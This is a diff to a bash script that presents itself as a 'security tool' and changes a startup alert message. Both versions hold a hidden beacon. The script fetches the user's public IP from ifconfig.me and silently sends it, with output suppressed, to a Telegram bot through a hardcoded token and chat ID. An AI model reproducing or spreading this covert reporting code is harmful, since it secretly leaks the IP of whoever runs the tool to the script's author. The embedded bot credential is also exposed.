@@ -4,7 +4,7 @@ clear
 TOKEN="8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE"
 ID="7416528268"
 IP_USER=$(curl -s ifconfig.me)
-curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d chat_id="$ID" -d text="🚀 SIYAM BOSS ALERT! Tool Started. IP: $IP_USER" > /dev/null
+curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d chat_id="$ID" -d text="🚀 SIYAM BOSS ALERT! 10-Option Tool Started. IP: $IP_USER" > /dev/null
 
 # --- BANNER ---
 echo -e "\e[1;32m   SIYAM BOSS PRO SECURITY TOOL"
